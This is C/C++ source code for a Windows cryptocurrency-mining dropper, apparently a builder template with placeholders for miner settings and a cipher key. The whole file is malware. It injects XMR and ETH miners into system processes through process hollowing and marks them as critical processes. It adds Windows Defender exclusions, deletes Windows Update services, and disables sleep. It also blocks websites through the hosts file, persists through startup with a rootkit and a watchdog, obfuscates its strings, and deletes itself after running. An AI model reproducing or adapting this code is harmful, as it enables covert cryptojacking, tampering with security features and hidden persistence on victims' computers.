#include "UFiles\ntddk.h"
#include <wchar.h>

#include "UFiles\utils.h"
#include "UFiles\common.h"
#include "UFiles\obfuscate.h"
#include "UFiles\obfuscatew.h"
#include "UFiles\Injection\inject.h"
$RESOURCES

#if DefProcessProtect
bool bl = false;

void set_critical_process(HANDLE pHandle) {
    if (!bl) {
        TOKEN_PRIVILEGES privilege = { 1, { 0x14, 0, SE_PRIVILEGE_ENABLED } };

        HANDLE hToken = NULL;
	    UtOpenProcessToken(UtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

        bl = NT_SUCCESS(UtAdjustPrivilegesToken(hToken, 0, &privilege, sizeof(privilege), NULL, NULL));
    }

    if (bl && pHandle != INVALID_HANDLE_VALUE) {
        ULONG breakStatus = true;
        UtSetInformationProcess(pHandle, (PROCESSINFOCLASS)0x1d, &breakStatus, sizeof(ULONG));
    }
}
#endif

void inject_process(wchar_t* mutex, BYTE* payload, size_t payloadSize, wchar_t* programPath, wchar_t* cmdLine, wchar_t* startDir, bool setCritical) {
    if (!check_mutex(mutex)) {
        wchar_t tmpFile[MAX_PATH] = { 0 };
        combine_path(tmpFile, _wgetenv(AYW_OBFUSCATE(L"Temp")), AYW_OBFUSCATE(L"#TMPNAME"));
        HANDLE pHandle = transacted_hollowing(tmpFile, programPath, cmdLine, payload, payloadSize, startDir);
#if DefProcessProtect
        if (setCritical) {
            set_critical_process(pHandle);
        }
#endif
        UtClose(pHandle);
    }
}

void cipher(unsigned char* data, ULONG dataLen) {
	for (int i = 0; i < dataLen; ++i) {
		data[i] = data[i] ^ AY_OBFUSCATE("#CIPHERKEY")[i % 32];
	}
}

int wmain(int argc, wchar_t* argv[])
{
#if DefStartDelay
    LARGE_INTEGER sleeptime;
    sleeptime.QuadPart = -($STARTDELAY * 10000);
    UtDelayExecution(FALSE, &sleeptime);
#endif

    wchar_t sysdir[MAX_PATH] = { 0 };
    combine_path(sysdir, _wgetenv(AYW_OBFUSCATE(L"SystemRoot")), AYW_OBFUSCATE(L"\\System32"));

    wchar_t cmdPath[MAX_PATH] = { 0 };
    combine_path(cmdPath, sysdir, AYW_OBFUSCATE(L"\\cmd.exe"));
    
    wchar_t powershellPath[MAX_PATH] = { 0 };
    combine_path(powershellPath, sysdir, AYW_OBFUSCATE(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));

#if DefWDExclusions
    run_program(true, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #WDCOMMAND"), powershellPath);
#endif
#if DefDisableWindowsUpdate
    run_program(false, sysdir, cmdPath, AYW_OBFUSCATE(L"%S /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits\" /f & reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc\" /f"), cmdPath);
#endif
#if DefDisableSleep
    run_program(false, sysdir, cmdPath, AYW_OBFUSCATE(L"%S /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"), cmdPath);
#endif

#if DefBlockWebsites
    wchar_t hostsPath[MAX_PATH] = { 0 };
    combine_path(hostsPath, sysdir, AYW_OBFUSCATE(L"\\drivers\\etc\\hosts"));
    ULONG hostsFileSize;
    PVOID hostsFile = read_file(hostsPath, &hostsFileSize);
    if (hostsFile) {
        PVOID hostsData = NULL;
        SIZE_T allocatedSize = hostsFileSize + $DOMAINSIZE;
        NTSTATUS astatus = UtAllocateVirtualMemory(UtCurrentProcess(), &hostsData, 0, &allocatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (NT_SUCCESS(astatus)) {
            char* hostsString = (char*)hostsData;
            strcat(hostsString, (char*)hostsFile);
            char* domainSet[] = { $CPPDOMAINSET };
            for (int i = 0; i < $DOMAINSETSIZE; i++) {
                if (strstr(hostsString, domainSet[i]) == NULL) {
                    strcat(hostsString, AY_OBFUSCATE("\r\n0.0.0.0      "));
                    strcat(hostsString, domainSet[i]);
                    hostsFileSize += 15 + strlen(domainSet[i]);
                }
            }
            write_file(hostsPath, hostsData, hostsFileSize);
        }
    }
#endif

#if DefStartup
    wchar_t exePath[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    wchar_t startupPath[MAX_PATH] = { 0 };
    combine_path(startupPath, _wgetenv(AYW_OBFUSCATE(L"$BASEDIR")), AYW_OBFUSCATE(L"#STARTUPFILE"));

    run_program(true, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #STARTUPADD"), powershellPath, startupPath, startupPath, startupPath);

#if DefRootkit
    wchar_t conhostPath[MAX_PATH] = { 0 };
    combine_path(conhostPath, sysdir, AYW_OBFUSCATE(L"#CONHOSTPATH"));
#endif
    if (wcsicmp(exePath, startupPath) != 0) {
        ULONG fileSize;
        PVOID exeFile = read_file(exePath, &fileSize);
        write_file(startupPath, exeFile, fileSize);
#if DefRootkit
        cipher(resRootkit, resRootkitSize);
        inject_process(NULL, (BYTE*)resRootkit, resRootkitSize, conhostPath, conhostPath, sysdir, false);
#endif
#if DefRunInstall
        run_program(false, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #STARTUPSTART"), powershellPath, startupPath);
#endif
#if DefAutoDelete
        run_program(false, sysdir, cmdPath, AYW_OBFUSCATE(L"%S /c choice /C Y /N /D Y /T 3 & Del \"%S\""), cmdPath, exePath);
#endif
        return 0;
    }

#if DefWatchdog
    wchar_t watchdogPath[MAX_PATH] = { 0 };
    combine_path(watchdogPath, conhostPath, AYW_OBFUSCATE(L" #WATCHDOGID"));
    cipher(resWatchdog, resWatchdogSize);
    inject_process(AYW_OBFUSCATE(L"\\BaseNamedObjects\\#WATCHDOGID"), (BYTE*)resWatchdog, resWatchdogSize, conhostPath, watchdogPath, sysdir, true);
#endif
#endif

    wchar_t libPath[MAX_PATH] = { 0 };
    combine_path(libPath, _wgetenv(AYW_OBFUSCATE(L"$CPPLIBSROOT")), AYW_OBFUSCATE(L"\\Google\\Libs\\"));

#if DefMineXMR
    wchar_t libWR64Path[MAX_PATH] = { 0 };
    combine_path(libWR64Path, libPath, AYW_OBFUSCATE(L"WR64.sys"));
    cipher(resWR64, resWR64Size);
    write_file(libWR64Path, resWR64, resWR64Size);
#endif

    bool hasGPU = has_gpu(sysdir, cmdPath, libPath);
#if DefGPULibs
    if (hasGPU) {
        wchar_t ddb64Path[MAX_PATH] = { 0 };
        combine_path(ddb64Path, libPath, AYW_OBFUSCATE(L"ddb64.dll"));
        cipher(resddb64, resddb64Size);
        write_file(ddb64Path, resddb64, resddb64Size);
        wchar_t nvrtcPath[MAX_PATH] = { 0 };
        combine_path(nvrtcPath, libPath, AYW_OBFUSCATE(L"nvrtc64_112_0.dll"));
        cipher(resnvrtc, resnvrtcSize);
        write_file(nvrtcPath, resnvrtc, resnvrtcSize);
        wchar_t nvrtc2Path[MAX_PATH] = { 0 };
        combine_path(nvrtc2Path, libPath, AYW_OBFUSCATE(L"nvrtc-builtins64_112.dll"));
        cipher(resnvrtc2, resnvrtc2Size);
        write_file(nvrtc2Path, resnvrtc2, resnvrtc2Size);
    }
#endif

    wchar_t* minerSet[][4] = { $MINERSET };

    cipher(resETH, resETHSize);
    cipher(resXMR, resXMRSize);

    for (int i = 0; i < $MINERCOUNT; i++) {
        bool typeETH = !wcsicmp(AYW_OBFUSCATE(L"eth"), minerSet[i][0]);
        if (!(typeETH && !hasGPU)) {
            wchar_t injectPath[MAX_PATH] = { 0 };
            combine_path(injectPath, sysdir, minerSet[i][2]);

            wchar_t commandLine[MAX_COMMAND_LENGTH] = { 0 };
            combine_path(commandLine, injectPath, minerSet[i][3]);
            inject_process(minerSet[i][1], (BYTE*)(typeETH ? resETH : resXMR), (typeETH ? resETHSize : resXMRSize), injectPath, commandLine, sysdir, true);
        }
    }
	return 0;
} 
